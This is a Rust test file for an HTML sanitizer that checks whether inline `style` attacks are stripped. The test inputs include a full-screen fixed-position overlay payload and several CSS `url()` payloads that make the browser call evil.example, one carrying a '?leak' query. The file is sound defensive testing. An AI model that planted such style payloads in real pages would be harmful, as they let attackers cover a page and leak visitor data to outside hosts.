//! What an untrusted fragment may do through `style`.
//!
//! The sanitizer's allow-list is built around script: handlers, `javascript:`
//! URIs and `<script>` are all removed. `style` was allowed through untouched,
//! and it needs no script to take a page over — `position:fixed` at full size
//! puts the attacker's markup on top of the real page, and any `url(...)` sends
//! the visitor's browser to them. Both are now filtered out by property.

use blackhole_engine::xss::sanitize_html;

#[test]
fn cannot_lift_content_over_the_page() {
    let out = sanitize_html(r#"<div style="position:fixed;top:0;left:0;z-index:99999">over</div>"#);
    assert!(!out.contains("position"), "{out}");
    assert!(!out.contains("z-index"), "{out}");
    assert!(!out.contains("top"), "{out}");
    // The content itself is not the problem and stays.
    assert!(out.contains("over"), "{out}");
}

#[test]
fn cannot_make_the_browser_call_out() {
    for input in [
        r#"<div style="background:url(https://evil.example/?leak)">x</div>"#,
        r#"<div style="background-image:url(https://evil.example/p.png)">x</div>"#,
        r#"<div style="list-style-image:url(https://evil.example/p.png)">x</div>"#,
    ] {
        let out = sanitize_html(input);
        assert!(!out.contains("evil.example"), "{input} -> {out}");
    }
}

#[test]
fn ordinary_presentation_still_works() {
    // The reason `style` is allowed at all — this must keep working.
    let out = sanitize_html(r#"<p style="color:red;font-weight:bold">hi</p>"#);
    assert!(out.contains("color:red"), "{out}");
    assert!(out.contains("font-weight:bold"), "{out}");
    // background-color is the half of `background` that fetches nothing.
    assert!(sanitize_html(r#"<p style="background-color:#eee">x</p>"#).contains("background-color"));
}
